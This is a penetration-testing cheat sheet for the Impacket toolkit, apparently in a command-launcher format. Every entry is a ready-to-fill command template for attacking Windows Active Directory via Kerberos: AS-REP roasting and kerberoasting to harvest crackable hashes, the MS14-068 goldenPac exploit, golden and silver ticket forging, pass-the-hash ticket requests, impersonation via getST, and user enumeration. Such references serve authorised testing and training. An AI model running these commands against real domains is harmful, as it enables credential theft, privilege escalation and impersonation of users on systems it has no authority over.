# Impacket

% impacket, windows, kerberos, 88

## GetNPUsers without password to get TGT (ASREPRoasting)
#platform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#platform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
#platform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
```

## MS14-068 - goldenPac
#platform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
#platform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
#platform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
#platform/linux #target/local  #cat/UTILS
```
ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - impersonate user
#platform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
#platform/linux #target/remote  #cat/UTILS
```
getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
#platform/linux #target/remote  #cat/RECON 
```
GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
```
